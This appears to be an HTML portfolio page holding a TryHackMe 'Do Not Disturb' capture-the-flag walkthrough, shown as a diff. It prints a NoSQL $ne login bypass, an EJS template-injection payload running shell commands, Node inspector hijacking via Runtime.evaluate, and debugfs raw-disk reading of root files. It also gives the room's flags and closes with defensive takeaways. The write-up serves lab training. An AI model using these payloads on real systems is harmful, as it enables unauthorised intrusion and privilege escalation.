@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Do Not Disturb // writeup</title>
+    <meta name="description" content="The Byte Lotus poolside platform hides an exposed Node.js inspector port. Following the intruder&#39;s footprints to a shell, then escalating through raw disk access.">
+    <meta name="theme-color" content="#0a0506">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="../style.css">
+    <script>
+        (function () {
+            try {
+                if (localStorage.getItem('theme') === 'light') {
+                    document.documentElement.setAttribute('data-theme', 'light');
+                }
+            } catch (e) { }
+        })();
+    </script>
+</head>
+
+<body class="writeup-page">
+    <div class="scanlines" aria-hidden="true"></div>
+    <div class="scroll-progress" id="scrollProgress"></div>
+
+    <header class="writeup-topbar">
+        <a class="prompt-link" href="../writeups.html">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~/writeups</span><span class="prompt-sym">$</span>
+            <span class="prompt-cmd">cd .. [Archive Portal]</span>
+        </a>
+        <div class="topbar-actions">
+            <a class="card-link small github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener"><i class="fab fa-github"></i> GitHub Repo</a>
+            <a class="card-link small" href="../index.html" style="margin-right: 0.5rem;"><i class="fas fa-terminal"></i> Main Dossier</a>
+            <span class="kbd-hint"><kbd>T</kbd> theme</span>
+            <button class="theme-toggle" id="themeToggle" type="button">
+                <i class="fas fa-moon"></i><span>Theme</span>
+            </button>
+        </div>
+    </header>
+
+    <main class="writeup-shell">
+        <article class="writeup-article">
+            <div class="writeup-head">
+                <p class="writeup-kicker">// verified laboratory walkthrough</p>
+                <h1>Do Not Disturb</h1>
+                <div class="writeup-meta">
+                    <span class="badge">TryHackMe</span>
+      <span class="badge ghost">Web / Boot2Root</span>
+      <span class="badge diff-medium">Medium</span>
+      <span class="meta-item"><i class="fas fa-calendar"></i> 2026-08-03</span>
+      <span class="meta-item"><i class="fas fa-tags"></i> TryHackMe / Web / Boot2Root / Node.js / Medium</span>
+      <span class="meta-item"><i class="fas fa-file-code"></i> do-not-disturb.md</span>
+                </div>
+                <p class="writeup-summary">The Byte Lotus poolside platform hides an exposed Node.js inspector port. Following the intruder&#39;s footprints to a shell, then escalating through raw disk access.</p>
+                <div class="writeup-actions">
+                    <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/do-not-disturb.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                    <a class="card-link" href="do-not-disturb.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                    <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Writeups Portal</a>
+                    <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                </div>
+            </div>
+            <div class="writeup-body">
+                <h1>The Byte Lotus Hotel — Boot2Root</h1>
+<h2>Room Summary</h2>
+<p>The Byte Lotus poolside platform tracks every cabana, sunbed and warm session. Someone is already inside — the goal is to follow the intruder’s footprints in, climb the way they climbed, and recover both flags. The machine runs a Node.js (Express) web app with an exposed Node.js inspector port, and the final escalation is achieved via raw disk access.</p>
+<h2>Flags</h2>
+<pre class="code-block" data-lang="bash"><code>THM{w4rm_s3ss10n_h1j4ck3d}</code></pre>
+<pre class="code-block" data-lang="bash"><code>THM{r4w_d1sk_4cc3ss_w4s_t00_much}</code></pre>
+<p>A full port scan revealed only two open services:</p>
+<pre class="code-block" data-lang="bash"><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu (Ubuntu Linux)
+80/tcp open  http    Node.js (Express middleware)
+The web root (http://10.48.177.169/) is a login page for the Byte Lotus poolside</code></pre>
+<p>platform. Directory fuzzing found:</p>
+<pre class="code-block" data-lang="bash"><code>/staff — 403 (staff console, access controlled)</code></pre>
+<pre class="code-block" data-lang="bash"><code>/logout — 302</code></pre>
+<h2>2. NoSQL Injection on the Login</h2>
+<pre class="code-block" data-lang="bash"><code>The login endpoint /login accepts JSON (Express + express.json()), which is a</code></pre>
+<p>classic sign of a document database (NeDB here). Operator injection into the query bypasses authentication:</p>
+<pre class="code-block" data-lang="bash"><code>POST /api/login HTTP/1.1
+Host: 10.48.177.169
+Content-Type: application/json</code></pre>
+<pre class="code-block" data-lang="bash"><code>{&quot;username&quot;:{&quot;$ne&quot;:&quot;guest&quot;},&quot;password&quot;:{&quot;$ne&quot;:null}}
+HTTP/1.1 200 OK
+{&quot;ok&quot;:true,&quot;role&quot;:&quot;staff&quot;}
+Set-Cookie: connect.sid=s%3A...; Path=/; HttpOnly
+Excluding guest forces the query to match the attendant account, which has the
+staff role. With this session cookie, /staff returns the Cabana Desk console.</code></pre>
+<h2>3. EJS Server-Side Template Injection (SSTI) → RCE as poolside</h2>
+<p>The staff console has a Confirmation template textarea (EJS) with a preview feature. EJS renders the template server-side, so an EJS expression is executed:</p>
+<pre class="code-block" data-lang="bash"><code>POST /staff/preview
+Cookie: connect.sid=s%3A...
+template=&lt;%=
+process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;).toString() %&gt;
+&lt;pre&gt;uid=996(poolside) gid=996(poolside) groups=996(poolside)&lt;/pre&gt;
+RCE as poolside confirmed. The user.txt flag was read from the service</code></pre>
+<p>account’s home directory:</p>
+<pre class="code-block" data-lang="bash"><code>$ cat /home/poolside/user.txt
+THM{w4rm_s3ss10n_h1j4ck3d}</code></pre>
+<h2>4. Node.js Inspector Hijack → RCE as pipelinesvc</h2>
+<p>Process enumeration revealed the telemetry service running with the inspector enabled:</p>
+<pre class="code-block" data-lang="bash"><code>USER         PID ... COMMAND
+pipelin+     600 ... /usr/bin/node --inspect=127.0.0.1:9229 processor.js
+poolside     602 ... /usr/bin/node app.js
+The lotus-telemetry.service unit confirms it:
+[Service]
+User=pipelinesvc
+Group=pipelinesvc
+ExecStart=/usr/bin/node --inspect=127.0.0.1:9229 processor.js
+The Node.js inspector (Chrome DevTools Protocol) was bound to 127.0.0.1:9229</code></pre>
+<ul><li>accessible from the box itself, but not externally. This is the room’s “warm</li></ul>
+<pre class="code-block" data-lang="bash"><code>session”: a debugging session running as pipelinesvc.
+A small WebSocket client (Node 22 native WebSocket) was uploaded to /tmp and
+used to evaluate JavaScript inside the processor.js process via
+Runtime.evaluate:</code></pre>
+<pre class="code-block" data-lang="bash"><code>GET http://127.0.0.1:9229/json/list
+ws = new WebSocket(target.webSocketDebuggerUrl);
+ws.send({id:1, method:&quot;Runtime.evaluate&quot;, params:{
+  expression:
+`process.mainModule.require(&#39;child_process&#39;).execSync(Cmd).toString()`,
+  returnByValue:true, awaitPromise:true }});
+$ node /tmp/eval_ws.js &#39;id&#39;
+uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)
+RCE as pipelinesvc — and notably the account belongs to the disk group.</code></pre>
+<h2>5. Raw Disk Access → Root Flag</h2>
+<pre class="code-block" data-lang="bash"><code>With the disk group, the raw root filesystem block device is readable (brw-
+rw---- root disk /dev/nvme0n1p1). Filesystem permissions can be bypassed
+entirely by reading files straight off the disk with debugfs:
+$ debugfs -R &#39;cat /root/root.txt&#39; /dev/nvme0n1p1
+debugfs 1.47.0 (5-Feb-2023)
+THM{r4w_d1sk_4cc3ss_w4s_t00_much}</code></pre>
+<h2>6. Attack Chain Summary</h2>
+<h1>Step Result</h1>
+<p>Authenticat 1</p>
+<pre class="code-block" data-lang="bash"><code>NoSQL injection ($ne) on /api/login
+ed as staff</code></pre>
+<pre class="code-block" data-lang="bash"><code>EJS SSTI in /staff/preview
+poolside
+Node inspector on 127.0.0.1:9229 via</code></pre>
+<pre class="code-block" data-lang="bash"><code>CDP Runtime.evaluate
+pipelinesvc
+disk group + debugfs raw partition</code></pre>
+<p>4 Root flag read</p>
+<h2>7. Key Takeaways</h2>
+<pre class="code-block" data-lang="bash"><code>JSON login endpoints should treat operators ($ne, $gt, $regex...) as</code></pre>
+<p>• untrusted — use parameterised/typed queries against document databases.</p>
+<pre class="code-block" data-lang="bash"><code>Never run ejs.render() on user input; template engines are Turing-</code></pre>
+<p>• complete on the server.</p>
+<pre class="code-block" data-lang="bash"><code>Never leave --inspect on a loopback-bound service; local users can still</code></pre>
+<p>• reach it (and even reverse-tunnel to it externally).</p>
+<pre class="code-block" data-lang="bash"><code>The disk group on Linux is effectively root — group membership should</code></pre>
+<p>• be audited for service accounts.</p>
+            </div>
+            <div class="writeup-foot">
+                <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Full Writeups Portal</a>
+                <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/do-not-disturb.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                <a class="card-link" href="do-not-disturb.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                <a class="card-link" href="mailto:parajulisameek@gmail.com"><i class="fas fa-envelope"></i> report a typo</a>
+            </div>
+        </article>
+    </main>
+
+    <footer class="site-footer">
+        <p class="footer-cmd">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~</span><span class="prompt-sym">$</span>
+            echo "Defense is good. Offense is mandatory."
+        </p>
+        <p class="footer-muted">&copy; <span id="year"></span> Sameek Parajuli &middot; <a href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener">GitHub /tryhackme_walkthroughs</a></p>
+    </footer>
+
+    <!-- Image Lightbox Modal -->
+    <div class="lightbox-modal" id="lightboxModal" hidden>
+        <div class="lightbox-backdrop"></div>
+        <div class="lightbox-content">
+            <img src="" id="lightboxImg" alt="Enlarged view">
+            <button class="lightbox-close" id="lightboxClose" type="button">&times;</button>
+        </div>
+    </div>
+
+    <div class="scroll-to-top" id="scrollToTop" role="button" tabindex="0" aria-label="Scroll to top">
+        <i class="fas fa-arrow-up"></i>
+    </div>
+
+    <script src="../script.js"></script>
+</body>
+
+</html>
